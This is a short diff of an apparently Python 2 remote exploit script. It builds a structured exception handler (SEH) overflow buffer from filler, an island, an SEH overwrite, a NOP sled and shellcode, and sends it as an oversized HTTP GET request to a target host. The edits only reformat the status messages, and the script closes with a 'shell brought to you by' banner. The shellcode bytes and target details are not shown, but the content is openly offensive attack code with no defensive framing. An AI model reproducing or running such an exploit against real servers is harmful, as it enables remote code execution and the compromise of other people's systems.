@@ -70,8 +70,8 @@ buffer= "A" * 4061 + island + seh + "\x90" * 4 + shellcode
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host,port))
-print "[*]Target acquired ----> " + host + " " + port
+print "[*]Target acquired ----> " + host + ":" + str(port) + "\r\n"
 s.send("GET " + buffer + " HTTP/1.0\r\n\r\n")
-print "[*]Buffer sent[*]"
+print "[*]Buffer sent[*]\r\n"
 s.close() 
-print "This shell has been brought to you by Gr1zz1y"
+print "This shell has been brought to you by Gr1zz1y\r\n"
